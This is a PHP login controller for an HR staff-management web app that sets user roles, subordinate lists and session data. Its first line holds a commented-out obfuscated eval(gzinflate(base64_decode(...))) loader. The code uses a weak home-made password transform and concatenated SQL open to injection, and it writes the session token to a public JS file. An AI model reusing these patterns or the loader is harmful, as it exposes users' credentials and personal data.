<?php 
  // eval(gzinflate(base64_decode("4+VSAAKVrOL8PAVbhbTMnNT49NSS+OT8vJLUvJJiDXWQkB5IWl3TmheiOCWxJBGoGCQYn5KanJ+SqgE2QEchJCjUFaYMQqaWJeZopFdl5qXlJJakaiQlFqeamcB1gUyKVvfxd/f0U4+NVs9OrVSP1dTUtAYA"))); 
require ('BaseController.php');
class LoginController extends BaseController
{

    function __construct($c, $f) {
        parent::__construct($c, $f);
    }

    public function validate() {
        $params = $this->getParameters();

        $user = trim($params['nickname']);
        $pass = trim($params['password']);

        $realPass = $this->getLoginPassword($pass);
        
        $jData = $this->getJoinData($user);
        $join_table         = $jData['join_table'];
        $fields_funcionario = $jData['fields_funcionario'];
        $join_condition     = $jData['join_condition'];

        // Update del menu
        //$query = "UPDATE web_opciones SET descripcion = 'Solicitud de Vehículos' WHERE num_opcion = 1;";
        //$this->execute(utf8_decode($query)); 
        //exit;         

        // Se valida que el usuario ingresado exista
        $query = "SELECT COUNT(u.cod_usuario) as existencia FROM seg_usuarios as u WHERE u.des_login = ?";
        $values = array($user);
        $stmt = $this->executeSecure($query, $values);
        $userExist = $this->getArray($stmt);
     
        $response = null;
        if ($userExist[0]['existencia'] == 0) {            
            $response = -2;
        }

        $query = "SELECT u.cod_usuario, 
                    u.des_usuario, 
                    u.des_login, 
                    u.ind_estado, 
                    u.cod_perfil, 
                    u.ind_bloqueo,
                    u.rol_web 
                    $fields_funcionario
                  FROM seg_usuarios as u $join_table
                  WHERE des_login = ? 
                    AND des_password = ? 
                    $join_condition";
        $values = array($user, $realPass);

        $stmt = $this->executeSecure($query, $values);    
        $data = $this->getArray($stmt);

        //Se valida si el usuario actual esta en session
        if (!array_key_exists('cod', $params)) {  
            $isLogged = false;
            if (sizeof($data) > 0){
                $isLogged = $this->checkIfUserIsLoged($data[0]["cod_usuario"]);
            }
            if ($isLogged) {
                echo json_encode(array('response'=>-3, 'cod'=>$data[0]["cod_usuario"]));
                exit;
            }
        } else {
            $codigo_usuario = trim($params['cod']);
            $this->setInactiveLastSession($codigo_usuario);
        }


        // Usuario Encontrado
        if (is_array($data) && sizeof($data) > 0) {

            session_start();

            //Set type of connection
            $_SESSION["CONNECTION_TYPE"] = $this->conn->databaseType;

            // Se valida si el usuario es administrador
            $user = $data[0];
            $is_admin_login = false;
            if (sizeof($user) <= 7){
                $is_admin_login = true;
            }

            // Usuario con permisos de acceso Web
            if ($user['rol_web'] != null) {

                $response = 1;

                $query = "SELECT *  
                          FROM web_permisos as wp 
                          WHERE wp.rol_usuario = ?";
                
                $values = array($user['rol_web']);
                $stmt = $this->executeSecure($query, $values); 
                $permits = $this->getArray($stmt);
                $_SESSION['cod_usuario']    = $user["cod_usuario"];
                $_SESSION['des_usuario']    = $user["des_usuario"];
                $_SESSION['des_login']      = $user["des_login"];
                $_SESSION['ind_estado']     = $user["ind_estado"];
                $_SESSION['ind_bloqueo']    = $user["ind_bloqueo"];
                $_SESSION['rol_web']        = $user['rol_web'];
                $_SESSION['modulos_acceso'] = $permits[0]['acceso_modulo'];
                $_SESSION['opt_sin_acceso'] = $permits[0]['opciones_sin_acceso'];

                if ($is_admin_login == true) {
                    $_SESSION['TIPO_FUNCIONARIO'] = "Super Admin";
                }

                if ($is_admin_login == false) {

                    $funcionario = array();
                    $funcionario['COD_FUNCIONARIO']         = $user["COD_FUNCIONARIO"];
                    $funcionario['DES_CEDULA']              = $user["DES_CEDULA"];
                    $funcionario['DES_APELLIDO1']           = $user["DES_APELLIDO1"];
                    $funcionario['DES_APELLIDO2']           = $user["DES_APELLIDO2"];
                    $funcionario['DES_NOMBRE']              = $user["DES_NOMBRE"];
                    $funcionario['COD_CENTRO']              = $user["COD_CENTRO"];
                    $funcionario['IND_TIPO_IDENTIFICACION'] = $user["IND_TIPO_IDENTIFICACION"];
                    $funcionario['IND_ESTADO_FUNC']         = $user["IND_ESTADO"];
                    foreach ($funcionario as $key => $value) {
                        $_SESSION[$key] = $value;
                    }

                    // Verifica si el usuario que ingresa es GERENTE
                    $type_empleado = $this->getTypeEmpleado($user["COD_FUNCIONARIO"]);

                    $funcionarios_in_charge = "";
                    // GERENTE
                    if ($type_empleado['isMag']) { 
                        $_SESSION['TIPO_FUNCIONARIO'] = 'MAG';

                        $listFuncionarios = $this->getFuncionariosEjecutivos();
                        foreach ($listFuncionarios as $f) {
                            $funcionarios_in_charge .= $f['cod_encargado']. ", ";
                        }

                        $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);

                    } else if ($type_empleado['isGerente']) {

                        $_SESSION['TIPO_FUNCIONARIO'] = 'GERENTE';

                        // Se obtiene la lista de funcionarios a cargo del Gerente
                        $query = "SELECT cc.cod_encargado FROM rh_centros_costo as cc 
                                  WHERE cc.cod_centro_padre is NULL AND cc.cod_centro != ?";
                        $values = array('04');
                        $stmt = $this->executeSecure($query, $values); 
                        $listFuncionarios = $this->getArray($stmt);
                        foreach ($listFuncionarios as $f) {
                            $funcionarios_in_charge .= $f['cod_encargado']. ", ";
                        }

                        // Se obtiene los funcionarios que pertenecen al centro de costo de gerencia (cod_centro = 07)
                        $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                  WHERE f.cod_centro = ? AND f.ind_estado != ?";
                        $values = array(trim($user["COD_CENTRO"]), 0);
                        $stmt = $this->executeSecure($query, $values); 
                        $listFuncionariosLocales = $this->getArray($stmt);
                        foreach ($listFuncionariosLocales as $f) {
                            $funcionarios_in_charge .= $f['COD_FUNCIONARIO']. ", ";
                        }
                        $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);

                    } else {

                        // AUDITOR
                        if ($type_empleado['isAuditor']) {

                            $_SESSION['TIPO_FUNCIONARIO'] = 'AUDITOR';

                            // Se obtiene los funcionarios que pertenecen al centro de costo del auditor
                            $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                      WHERE f.cod_centro = ? AND f.ind_estado != ?";
                            $values = array(trim($user["COD_CENTRO"]), 0);
                            $stmt = $this->executeSecure($query, $values); 
                            $listFuncionariosLocales = $this->getArray($stmt);
                            foreach ($listFuncionariosLocales as $f) {
                                $funcionarios_in_charge .= $f['COD_FUNCIONARIO']. ", ";
                            }
                            $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);

                        } else {

                            $listaDirecciones = $this->getTypeDirecciones();

                            //echo $listaDirecciones;

                            /**
                             * Usuarios: Directores, Lideres de Proceso 
                             */
                            $query = "SELECT cc.cod_centro FROM rh_centros_costo as cc 
                                      WHERE cc.cod_centro_padre is NULL AND cc.cod_encargado = ? 
                                      AND cc.cod_centro in ($listaDirecciones)";
                                      //echo $query;
                                      //echo $user["COD_FUNCIONARIO"];
                            $values = array($user["COD_FUNCIONARIO"]);
                            $stmt = $this->executeSecure($query, $values); 
                            $isCodEncargado = $this->getArray($stmt);
                            //print_r($isCodEncargado);
                            //exit;
                            //DIRECTOR
                            if (sizeof($isCodEncargado) > 0) {
                                
                                //$_SESSION['TIPO_FUNCIONARIO'] = 'DIRECTOR';
                                $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeFuncionario('DIRECTOR', $isCodEncargado[0]['cod_centro']);

                                // Se mueve porque no solo aplica  para direcciones sino tambien para jefaturas
                                // $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeDirector($isCodEncargado[0]['cod_centro']);

                                $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                          WHERE f.cod_centro like '".trim($isCodEncargado[0]['cod_centro'])."%' 
                                          AND f.ind_estado != ? 
                                          AND f.COD_FUNCIONARIO != ?";
                                
                                $values = array(0, $user["COD_FUNCIONARIO"]);
                                $stmt = $this->executeSecure($query, $values);  
                                $listFuncionariosLocales = $this->getArray($stmt);
                                foreach ($listFuncionariosLocales as $f) {
                                    $funcionarios_in_charge .= $f['COD_FUNCIONARIO']. ", ";
                                }
                                $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);
                                
                            // LIDERES DE PROCESO Y SUB-PROCESO
                            } else {

                                //$_SESSION['TIPO_FUNCIONARIO'] = 'JEFE';
                                $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeFuncionario('JEFE', $user["COD_CENTRO"]);

                                // Se verifica si el usuario es lider con subprocesos
                                $query = "SELECT cc.cod_centro FROM rh_centros_costo as cc 
                                          WHERE cc.cod_centro_padre is not NULL 
                                          AND cc.cod_centro in (SELECT bb.cod_centro_padre FROM rh_centros_costo as bb)  
                                          AND cc.cod_encargado = ?";
                                $values = array($user["COD_FUNCIONARIO"]);
                                $stmt = $this->executeSecure($query, $values);  
                 
                                $isLiderSubproceso = $this->getArray($stmt);

                                if (sizeof($isLiderSubproceso) > 0) {

                                    $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                              WHERE f.cod_centro like '".trim($isLiderSubproceso[0]["cod_centro"])."%' 
                                              AND f.ind_estado != ? 
                                              AND f.COD_FUNCIONARIO != ?";
           
                                    $values = array(0, $user["COD_FUNCIONARIO"]);
                                    $stmt = $this->executeSecure($query, $values);
                                    $listFuncionariosLocales = $this->getArray($stmt);
                                    foreach ($listFuncionariosLocales as $f) {
                                        $funcionarios_in_charge .= $f['COD_FUNCIONARIO']. ", ";
                                    }
                                    $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);

                                } else {

                                    $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                              WHERE f.cod_centro like '".trim($user["COD_CENTRO"])."%' 
                                              AND f.ind_estado != ? 
                                              AND f.COD_FUNCIONARIO != ?";
                                    
                                    $values = array(0, $user["COD_FUNCIONARIO"]);
                                    $stmt = $this->executeSecure($query, $values);
                                    $listFuncionariosLocales = $this->getArray($stmt);
                                    foreach ($listFuncionariosLocales as $f) {
                                        $funcionarios_in_charge .= $f['COD_FUNCIONARIO']. ", ";
                                    }

                                    $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);

                                }

                            }

                        }

                    }


                    /**
                     * Proceso independiente para conocer si el usuario es Autorizado
                     */
                    $funcionarios_in_charge_2 = "";
                    $query = "SELECT DISTINCT(ad.cod_centro) FROM rh_autorizados_direccion as ad 
                              WHERE ad.cod_funcionario = ?";
                    $values = array($user["COD_FUNCIONARIO"]);
                    $stmt = $this->executeSecure($query, $values);
                    $isCodAutorizado = $this->getArray($stmt);

                    //AUTORIZADO
                    if (sizeof($isCodAutorizado) > 0) {

                        $funcionarios_del_autorizado = array();
                        foreach ($isCodAutorizado as $cc) {

                            $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                      WHERE f.cod_centro like '".trim($cc['cod_centro'])."%' 
                                      AND f.ind_estado != ? 
                                      AND f.COD_FUNCIONARIO != ? 
                                      AND f.COD_FUNCIONARIO not in (SELECT rhcc.cod_encargado FROM rh_centros_costo as rhcc WHERE rhcc.cod_centro = '".trim($cc['cod_centro'])."')";
                            $values = array(0, $user["COD_FUNCIONARIO"]);
                            $stmt = $this->executeSecure($query, $values);
                            $list = $this->getArray($stmt);

                            foreach ($list as $lC) {
                                array_push($funcionarios_del_autorizado, $lC['COD_FUNCIONARIO']);
                            }

                            foreach ($funcionarios_del_autorizado as $f) {
                                $funcionarios_in_charge_2 .= $f. ", ";
                            }
                        }

                    }

                    // SE UNIFICAN LAS LISTAS
                    if ($funcionarios_in_charge_2 != "") {
                        
                        $funcionarios_in_charge_2 = substr($funcionarios_in_charge_2, 0, -2);

                        if ($funcionarios_in_charge != $funcionarios_in_charge_2) {

                            $funcionarios_in_charge .= ", ".$funcionarios_in_charge_2;
                        }
                    }

                    // Se colocan los Funcionarios a Cargo en Session
                    $_SESSION['FUNCIONARIOS_A_CARGO'] = $funcionarios_in_charge;
                    $_SESSION['COD_EMPLEADO']         = $type_empleado['cod_empleado'];

                    // Obtencion de los Centros Costo
                    // ======================================
                    $query = "SELECT cc.cod_centro 
                              FROM rh_centros_costo as cc
                              WHERE cc.cod_encargado = ?";
                    
                    $values = array($user["COD_FUNCIONARIO"]);
                    $stmt = $this->executeSecure($query, $values); 
                    $centros_costo = $this->getArray($stmt);
                    $allCentrosCosto = [];
                    foreach ($centros_costo as $centro) {
                        array_push($allCentrosCosto, trim($centro['cod_centro']));
                    }
                    $query = "SELECT ad.cod_centro 
                              FROM rh_autorizados_direccion as ad
                              WHERE ad.cod_funcionario = ?";
                    
                    $values = array($user["COD_FUNCIONARIO"]);
                    $stmt = $this->executeSecure($query, $values); 
                    $centros_costo_autorizados_direccion = $this->getArray($stmt);
                    foreach ($centros_costo_autorizados_direccion as $centro) {
                        array_push($allCentrosCosto, trim($centro['cod_centro']));
                    }

                    // Se colocan los centros de costo en session.
                    $_SESSION['CENTROS_COSTO'] = array_unique($allCentrosCosto);


                }

                $key = $this->getUniqueLoginAccess();
                $dbDateTime = $this->getDbDateTime();
                $_SESSION['login_dateTime']  = $dbDateTime;
                $_SESSION['login_token']  = $key;

                if ($params['nickname'] != 'admin') {
                    if (strlen(trim($user['IMG_FOTO'])) > 0) {
                        $_SESSION['IMG_FOTO']  = $user['IMG_FOTO'];    
                    } else {
                        $_SESSION['IMG_FOTO']  = '';
                    }
                } else {
                    $_SESSION['IMG_FOTO']  = '';
                    $_SESSION['COD_EMPLEADO'] = 'ADMIN';
                }
                
                //SET PROFILE DATA
                
                $nCodFuncionario = 0;
                if ($params['nickname'] != 'admin'){
                    $nCodFuncionario = $user["COD_FUNCIONARIO"];
                }

                $profileData = $this->getProfileData($params['nickname'], $nCodFuncionario, $_SESSION["CONNECTION_TYPE"]);                
                   
                /*        
                echo "<pre>";
                print_r($_SESSION);
                echo "</pre>";
                exit;
                */
                
            
                $_SESSION['PROFILE_DATA'] = $profileData;
                
                
                //$qSession = "INSERT INTO web_log_session (cod_usuario, login_token, login_date, login_time, login_status) 
                //             VALUES (?, ?, ?, ?, ?)";

                $qSession = "INSERT INTO web_log_session (cod_usuario, login_token, login_date, login_time, login_status) 
                             VALUES (".$user['cod_usuario'].", '$key', '".$dbDateTime['date']."T00:00:00', '".$dbDateTime['time']['full_time']."', 'A')";

                //$vSession = array($user["cod_usuario"], $key, $dbDateTime['date'].' 00:00:00', $dbDateTime['time']['full_time'], 'A');
                //$stmtSession = $this->executeSecure($qSession, $vSession);
                $stmtSession = $this->execute($qSession);
                

                $fichero = '../ng-app/session.file.js';
                // Añade una nueva persona al fichero
                $actual = "var session = '$key'";
                // Escribe el contenido al fichero
                file_put_contents($fichero, $actual);            

            // Usuario sin permisos de acceso Web
            } else {
                session_destroy();
                $response = -1;
            }

        // Usuario NO encontrado
        } else {

            if ($response == -2) {
                $response = $response;
            } else {
                $response = 0;
            }
        }

        /*
        $queryx = "SELECT * FROM web_log_session";
        
        $valuesx = array();
        $stmtx = $this->executeSecure($queryx, $valuesx);
        $vx = $this->getArray($stmtx);
        */

        // Se devuelve el estado del usuario 
        $data_result = array('response'=>$response);

        echo json_encode($data_result);

    }

    private function checkIfUserIsLoged($codUser) {

        $query = "SELECT COUNT(*) as uLoged FROM web_log_session 
                   WHERE cod_usuario = ? 
                    AND login_status = ?";
        
        $values = array($codUser, 'A');
        $stmt = $this->executeSecure($query, $values);
        $data = $this->getArray($stmt)[0];

        if ($data['uLoged'] > 0) {
            return true;
        } else {
            return false;
        }
    }

    private function setInactiveLastSession($codUser) {
        $qSessionUpdate = "UPDATE web_log_session SET login_status = ? WHERE cod_usuario = ?";
        $vSessionUpdate = array('I', $codUser);
        $stmtSession = $this->executeSecure($qSessionUpdate, $vSessionUpdate);
    }

    /**
     * Get the truly password access for the user
     * @param $pass password provided by th web form
     */
    private function getLoginPassword($pass) {
        $passArray = str_split($pass);
        $passVal = 0;
        $listVals = array();
        for ($i=0; $i < sizeof($passArray); $i++) { 
            $passVal = $passVal + (ord($passArray[$i]) * ($i+1));
            array_push($listVals, $passVal);        
        }
        $expo2 = pow($passVal, 2) * 8;  
        if ($expo2 > 2147483647) {
            $expo2 = 0;
        }
        $expo9 = pow($passVal, 9) * 8;
        if ($expo9 > 2147483647) {
            $expo9 = 0;
        }
        $realPass = $expo2 + $expo9;
        return $realPass;
    }

    private function getUniqueLoginAccess () {
        $key = implode('-', str_split(substr(strtolower(md5(microtime().rand(1000, 9999))), 0, 30), 6));
        return $key;
    }

    private function getJoinData($user){
        $join_table         = "";
        $fields_funcionario = "";
        $join_condition     = "";
        if ($user != "admin") {
            $join_table = ", rh_funcionarios as f ";
            $fields_funcionario = ", f.COD_FUNCIONARIO, 
                f.DES_CEDULA, 
                f.DES_APELLIDO1, 
                f.DES_APELLIDO2, 
                f.DES_NOMBRE, 
                f.COD_CENTRO, 
                f.IND_TIPO_IDENTIFICACION, 
                f.IND_ESTADO,
                f.IMG_FOTO";
            $join_condition = "AND u.cod_funcionario = f.cod_funcionario";
        }
        return array (
            "join_table"         => $join_table,
            "fields_funcionario" => $fields_funcionario,
            "join_condition"     => $join_condition,
        );
    }

    private function getProfileData($loginUser, $codFuncionario, $connectionType) {

        $nameJefe = 'CONCAT (rhf.des_nombre, SPACE(1),rhf.des_apellido1, SPACE(1), rhf.des_apellido2)';
        $fecIngreso = 'f.FEC_INGRESO';
        if ($connectionType == "odbc_mssql") {
            $nameJefe = 'rhf.des_nombre + \' \' + rhf.des_apellido1 + \' \' + rhf.des_apellido2 ';            
            $fecIngreso = 'CONVERT(VARCHAR(33), f.FEC_INGRESO, 126)';
        }

        if ($loginUser != "admin") {
            $query = "SELECT f.COD_FUNCIONARIO, 
                        f.DES_CEDULA, 
                        f.DES_APELLIDO1, 
                        f.DES_APELLIDO2, 
                        f.DES_NOMBRE, 
                        f.COD_CENTRO, 
                        f.IND_TIPO_IDENTIFICACION, 
                        cc.des_centro, 
                        p.des_puesto,
                        h.tip_jornada, 
                        f.NUM_PLAZA,
                        $fecIngreso as FEC_INGRESO, 
                        f.IND_NOMBRAMIENTO, 
                        f.IND_GRADO_ACADEMICO,
                        f.CAN_ANOS_ANTIGUEDAD, 
                        f.CAN_ANOS_ANTIGUEDAD,
                        f.CAN_ANOS_RECONOCIDA,
                        f.CAN_PUNTOS_CARRERA,
                        f.POR_PROHIBICION,
                        f.POR_DEDICACION_EXCLUSIVA,
                        (SELECT $nameJefe FROM rh_funcionarios as rhf 
                         WHERE f.cod_responsable = rhf.cod_funcionario) as JEFATURA 
                         FROM RH_HORARIOS h RIGHT OUTER JOIN RH_FUNCIONARIOS f ON h.cod_horario = f.COD_HORARIO 
                            LEFT OUTER JOIN RH_PUESTOS p ON f.COD_PUESTO = p.cod_puesto,   
                            RH_CENTROS_COSTO cc 
                            WHERE f.COD_CENTRO = cc.COD_CENTRO 
                            AND  f.cod_funcionario =  $codFuncionario";


                        //print_r($query);
                        //exit;
            $values = array($codFuncionario);
            $stmt = $this->execute($query);
            /*
            echo "<pre>";
            print_r($stmt);
            echo "</pre>";
            exit;
            */
            $data = $this->getArray($stmt)[0];
        } else {

            $data = array (
                "COD_FUNCIONARIO" => 0,
                "DES_CEDULA" => '- no aplica -',
                "DES_APELLIDO1" => '',
                "DES_APELLIDO2" => '',
                "DES_NOMBRE" => 'Admnistrador',
                "COD_CENTRO" => '',
                "IND_TIPO_IDENTIFICACION" => '',
                "des_centro" => '',
                "des_puesto" => 'Super Administrador',
                "NUM_PLAZA" => '',
                "FEC_INGRESO" => '',
                "IND_NOMBRAMIENTO" => 'no aplica',
                "IND_GRADO_ACADEMICO" => 'no aplica',
                "CAN_ANOS_ANTIGUEDAD" => 0,
                "CAN_ANOS_RECONOCIDA" => 0,
                "CAN_PUNTOS_CARRERA" => 0,
                "POR_PROHIBICION" => 0,
                "POR_DEDICACION_EXCLUSIVA" => 0,
                "JEFATURA" => ''
            ); 
        }   

        if ($connectionType == "odbc_mssql") {
            $newData = array();
            foreach ($data as $key => $line) {
                $e = utf8_encode($line);                
                $newData[$key] = $e;
            }           
          $data = $newData;          
        }
            
        return $data;
    }

    private function getDbDateTime() {
        $query = "SELECT getdate() as  db_date_time";
        $stmt  = $this->execute($query); 
        $data  = $this->getArray($stmt);

        $date_data  = date_create($data[0]['db_date_time']);
        $date       = date_format($date_data,"Y-m-d");        
        $full_time  = date_format($date_data,"H:i:s");

        $time_parts = explode(":", $full_time);

        $info_date  = array('date'=> $date, 
                            'time' => array('full_time' => $full_time, 
                                            'hours'     => $time_parts[0], 
                                            'minutes'   => $time_parts[1], 
                                            'seconds'   => $time_parts[2])
                    );

        return $info_date;
    }

    private function getTypeEmpleado($codFuncionario) {
        $query = "SELECT e.cod_empleado 
                FROM sif_empleados_pima as e 
                WHERE e.cod_funcionario = ?";               
        $filter_values = array($codFuncionario);
        $stmt = $this->executeSecure($query, $filter_values); 
        $cod_empleado = $this->getArray($stmt);
        $data = array();
        $data['isGerente'] = false;
        $data['isAuditor'] = false;
        $data['isRegular'] = false;
        $data['isMag'] = false;
        if (sizeof($cod_empleado) > 0) {
            $maxPos = sizeof($cod_empleado) - 1;
            if (trim($cod_empleado[$maxPos]['cod_empleado']) == "GGP") {
                $data['isGerente']    = true;
                $data['cod_empleado'] = $cod_empleado[$maxPos]['cod_empleado'];
            } else if (trim($cod_empleado[$maxPos]['cod_empleado']) == "AUD" || trim($cod_empleado[$maxPos]['cod_empleado']) == "AD") {
                $data['isAuditor'] = true;
                $data['cod_empleado'] = $cod_empleado[$maxPos]['cod_empleado'];
            } else if (trim($cod_empleado[$maxPos]['cod_empleado']) == "PCD") {
                $data['isMag'] = true;
                $data['cod_empleado'] = $cod_empleado[$maxPos]['cod_empleado'];
            }else {
                $data['isRegular']    = true;
                // Se determina si es el abogado o el asistente
                if (trim($cod_empleado[$maxPos]['cod_empleado']) == "ABG" || trim($cod_empleado[$maxPos]['cod_empleado']) == "ABG1"){
                    $data['cod_empleado'] = trim($cod_empleado[$maxPos]['cod_empleado']);
                } else {
                    $data['cod_empleado'] = 'OTHER';
                }
                
            }
            
        } else {
            $data['isRegular']    = true;
            $data['cod_empleado'] = 'OTHER';
        }
        return $data;
    }

    private function getTypeFuncionario($currentTipo, $codEncargado) {

        $listConfiguradores = array (60, 25);

        $listTypesDirectores = array();

        foreach ($listConfiguradores as $codConfigurador) {

            $query = "SELECT val_dato, cod_configurador 
                      FROM SIF_CONFIGURADORES 
                      WHERE cod_configurador = ?;";
            $filter_values = array($codConfigurador);
            $stmt = $this->executeSecure($query, $filter_values); 
            $dato = $this->getArray($stmt);

            array_push($listTypesDirectores, $dato[0]);

        }

        $typeDirector = $currentTipo;
        foreach ($listTypesDirectores as $tDir) {

            // CONFIGURADOR 60
            if ( (trim($tDir['val_dato']) == $codEncargado) && (trim($tDir['cod_configurador']) == $listConfiguradores[0]) ) {
                $typeDirector = "DIR. FINANCIERO";

            // CONFIGURADOR 25                
            } else if ( ($tDir['val_dato'] == $codEncargado) && ($tDir['cod_configurador'] == $listConfiguradores[1]) ) {
                $typeDirector = "JEFE SERVICIOS GENERALES";
            }

        }

        return $typeDirector;
    }

    private function getTypeDirecciones() {

        $listConfiguradores = array (60, 83, 84, 85, 102, 112);

        $listTypesDirecciones = array();

        foreach ($listConfiguradores as $codConfigurador) {

            $query = "SELECT Left(RTrim(val_dato),2) as centro 
                      FROM SIF_CONFIGURADORES 
                      WHERE cod_configurador = ?;";
            $filter_values = array($codConfigurador);
            $stmt = $this->executeSecure($query, $filter_values); 
            $dato = $this->getArray($stmt);

            array_push($listTypesDirecciones, $dato[0]);

        }

        $list_of_direcciones = "";
        foreach ($listTypesDirecciones as $d) {
            $list_of_direcciones .= "'".trim($d['centro']). "', ";
        }
        $list_of_direcciones = substr($list_of_direcciones, 0, -2);     

        return $list_of_direcciones;
    }

    private function getFuncionariosEjecutivos() {
        $sql = "SELECT RH_CENTROS_COSTO.COD_ENCARGADO as cod_encargado
                FROM SIF_CONFIGURADORES,   
                        RH_CENTROS_COSTO  
                WHERE ( SIF_CONFIGURADORES.val_dato = RH_CENTROS_COSTO.COD_CENTRO ) and  
                        ( ( SIF_CONFIGURADORES.cod_configurador in (50,62,64) ) )";
        $result = $this->execute($sql);
        $funcionarios = $this->getArray($result);

        return $funcionarios;

    }

}
?>